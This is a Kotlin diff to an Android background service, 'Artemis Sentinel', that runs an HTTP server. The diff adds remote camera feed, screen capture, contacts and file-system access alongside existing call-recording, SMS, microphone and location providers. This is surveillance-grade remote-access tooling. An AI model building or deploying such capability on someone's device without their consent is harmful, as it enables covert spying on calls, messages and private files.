@@ -12,6 +12,7 @@ import androidx.core.app.NotificationCompat
 import androidx.work.ExistingPeriodicWorkPolicy
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
+import androidx.lifecycle.LifecycleService
 import com.example.artemis.ArtemisApp
 import com.example.artemis.auth.AuthManager
 import com.example.artemis.data.AppDatabase
@@ -19,9 +20,14 @@ import com.example.artemis.receiver.DozeRecoveryReceiver
 import com.example.artemis.feature.CallLogsProvider
 import com.example.artemis.feature.CallRecorder
 import com.example.artemis.feature.CameraController
+import com.example.artemis.feature.CameraFeedController
+import com.example.artemis.feature.BatteryHelper
+import com.example.artemis.feature.ContactsProvider
 import com.example.artemis.feature.DeviceInfoProvider
+import com.example.artemis.feature.FileSystemHelper
 import com.example.artemis.feature.LocationTracker
 import com.example.artemis.feature.MicController
+import com.example.artemis.feature.ScreenCaptureController
 import com.example.artemis.feature.SmsProvider
 import com.example.artemis.feature.VideoRecorder
 import com.example.artemis.server.SimpleHttpServer
@@ -32,7 +38,7 @@ import kotlinx.coroutines.cancel
 import kotlinx.coroutines.launch
 import java.util.concurrent.TimeUnit
 
-class ArtemisSentinelService : Service() {
+class ArtemisSentinelService : LifecycleService() {
 
     private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
     private lateinit var app: ArtemisApp
@@ -46,6 +52,9 @@ class ArtemisSentinelService : Service() {
     private lateinit var smsProvider: SmsProvider
     private lateinit var callRecorder: CallRecorder
     private lateinit var videoRecorder: VideoRecorder
+    private lateinit var cameraFeedController: CameraFeedController
+    private lateinit var contactsProvider: ContactsProvider
+    private lateinit var fileSystemHelper: FileSystemHelper
     private lateinit var artemisServer: SimpleHttpServer
 
     private var wakeLock: PowerManager.WakeLock? = null
@@ -90,15 +99,22 @@ class ArtemisSentinelService : Service() {
         database = AppDatabase.getInstance(this)
         deviceInfoProvider = DeviceInfoProvider(this)
         locationTracker = LocationTracker(this, database)
-        cameraController = CameraController(this)
+        cameraController = CameraController(this, this)
         micController = MicController(this)
         callLogsProvider = CallLogsProvider(this)
         smsProvider = SmsProvider(this)
         callRecorder = CallRecorder(this)
-        videoRecorder = VideoRecorder(this)
+        videoRecorder = VideoRecorder(this, this)
+        cameraFeedController = CameraFeedController(this, cameraController)
+        contactsProvider = ContactsProvider(this)
+        fileSystemHelper = FileSystemHelper(this)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // LifecycleService drives the lifecycle from onStartCommand — MUST
+        // call super so the camera (bound to this service's lifecycle)
+        // reaches STARTED before any capture is attempted.
+        super.onStartCommand(intent, flags, startId)
         when (intent?.action) {
             ACTION_START -> startServer()
             ACTION_STOP -> stopServer()
@@ -134,7 +150,12 @@ class ArtemisSentinelService : Service() {
             callLogsProvider = callLogsProvider,
             smsProvider = smsProvider,
             callRecorder = callRecorder,
-            videoRecorder = videoRecorder
+            videoRecorder = videoRecorder,
+            cameraFeedController = cameraFeedController,
+            screenCaptureController = ScreenCaptureController.get(this),
+            fileSystemHelper = fileSystemHelper,
+            contactsProvider = contactsProvider,
+            batteryHelper = BatteryHelper(this)
         )
 
         serviceScope.launch {
@@ -172,6 +193,8 @@ class ArtemisSentinelService : Service() {
             micController.release()
             callRecorder.release()
             videoRecorder.release()
+            cameraFeedController.release()
+            ScreenCaptureController.get(this@ArtemisSentinelService).stop()
             releaseWakeLock()
             stopForeground(STOP_FOREGROUND_REMOVE)
             stopSelf()
@@ -210,7 +233,7 @@ class ArtemisSentinelService : Service() {
             "$deviceName — up $uptime"
         }
         return NotificationCompat.Builder(this, ArtemisApp.CHANNEL_SERVICE)
-            .setContentTitle("Artemis Sentinel v2.2.0 Active")
+            .setContentTitle("Artemis Sentinel v2.3.0 Active")
             .setContentText(contentText)
             .setSmallIcon(android.R.drawable.ic_menu_compass)
             .setPriority(NotificationCompat.PRIORITY_LOW)
@@ -278,8 +301,6 @@ class ArtemisSentinelService : Service() {
         } catch (_: Exception) { }
         dozeRecoveryReceiver = null
     }
-
-    override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
